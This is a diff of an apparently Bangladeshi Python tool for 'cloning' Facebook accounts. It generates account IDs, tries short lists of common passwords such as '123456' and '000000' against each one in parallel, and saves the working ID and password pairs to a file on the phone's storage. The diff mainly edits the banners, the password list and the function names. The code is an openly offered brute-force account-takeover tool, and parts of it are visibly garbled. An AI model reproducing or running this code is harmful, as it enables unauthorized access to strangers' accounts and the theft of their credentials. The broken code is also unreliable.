@@ -1,8 +1,4 @@
-#OWNER MOSABBIR #FUCK_XX
-#mosabbirold_FUCK_XNX #FUCK_XX
-#GIFT BY MOSABBIR #FUCK_XX
-#OPENED BY MOSABBIR #FUCK_XX
-#HELP BY SIKRA NIKNAME(H41N4)
+#GIFT BY MOSABBIR
 import os, sys, json, uuid, string, random, requests
 from concurrent.futures import ThreadPoolExecutor
 import os, sys, json, uuid, string, random, requests
@@ -56,8 +52,8 @@ def ____banner____():
  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|    '  V/1.1
 \n---------------------------------
 [âœª] OWNER      : MOSABBIR 
-[âœª] DEVELOPER  :  MOSABBIR
-[âœª] STATUS     : FREE [+] V/1.1
+[âœª] DEVELOPER  : MOSABBIR
+[âœª] STATUS     : PRIVATE  [+] V/1.1
 [âœª] TOOLS      : OLD & RANDOM & FILE
 ---------------------------------""")
     
@@ -65,7 +61,7 @@ def ____banner____():
 def main():
     ____banner____()
     print("[1] FILE CLONE [SOON] ")
-    print("[2] RANDOM CLONEv[WORK]");os.system("xdg-open https://t.me/mosabbirhossainsajib")
+    print("[2] RANDOM CLONE [SOON]");os.system("xdg-open https://t.me/mosabbirhossainsajib")
     print("[3] START CLONE [2009][WORK]")
     print("[4] NAGAD HALF INFO[]SOON")
     print("[5] NAGAD BAN [SOON]")
@@ -108,7 +104,7 @@ def fuckMyxmosabbirold(series):
         print("-------------------------------")
         for love in gen:
             ids = SEX + love
-            passlist = ["123456", "1234567", "12345678", "123456789"," iloveyou","1234567890","Bangladesh","135790"]
+            passlist = ["123456", "1234567", "12345678", "123456789"," 000000","1234567890"]
             Fuck_xnxx.submit(Fucking_life, ids, passlist)
     sys.exit("\n-------------------------------")
     
@@ -116,7 +112,7 @@ def fuckMyxmosabbirold(series):
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
-    sys.stdout.write(f"\MOSABBIR [{loop}]|OK:[{len(cps)}]")
+    sys.stdout.write(f"\MOSABBIR [{loop}]|OK:[{len(cps)}]")
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -130,8 +126,8 @@ def Fucking_life(ids, passlist):
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1bAMOSABBIRðŸ’ŽMOSABBIRðŸ’ŽOK | {ids} â€¢ {pas}")
-                open("/sdcard/mosabbirold-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1bAROOTðŸ’MOSABBIR’ŽOK | {ids} â€¢ {pas}")
+                open("/sdcard/mosabbir-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
         loop += 1
@@ -140,7 +136,9 @@ def Fucking_life(ids, passlist):
         
 #______________RANDDOM DEF_______________#
 {"""
-def fuckMyxmosabbirrandom:
+def FUCK_XNXXX():
+    user=[]
+    clear()
     ____banner____()
     os.system("xdg-open https://t.me/mosabbirhossainsajib")
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
@@ -177,7 +175,7 @@ def fuckMyxmosabbirrandom:
     BROKEN_ASIF()
     
 #______________RANDDOM METHOD_______________#
-{"""
+
 def FUCK_FRIEND(ids,passlist):
     global oks
     global cps
